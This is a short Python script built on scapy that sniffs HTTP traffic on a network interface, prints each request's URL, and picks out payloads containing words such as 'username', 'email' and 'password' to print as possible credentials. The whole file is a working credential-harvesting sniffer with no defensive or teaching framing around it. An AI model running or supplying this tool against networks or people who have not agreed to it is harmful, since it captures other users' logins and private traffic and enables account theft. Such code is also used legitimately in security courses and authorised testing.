#!/usr/bin/env python3
import scapy.all as scapy
import scapy.layers.http as http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_credentials(packet):
    matches = ["user", "username", "uname", "login", "email", "password", "pwd", "pass"]

    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        if any(x in str(load) for x in matches):
            return load

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> {0}".format(url.decode()))
        creds = get_credentials(packet)

        if creds:
            print("##########")
            print("[+] Possible Username/Password: {0}".format(creds))
            print("##########")


if __name__ == "__main__":
    print("[+] Sniffing packets...")
    sniff("eth0")
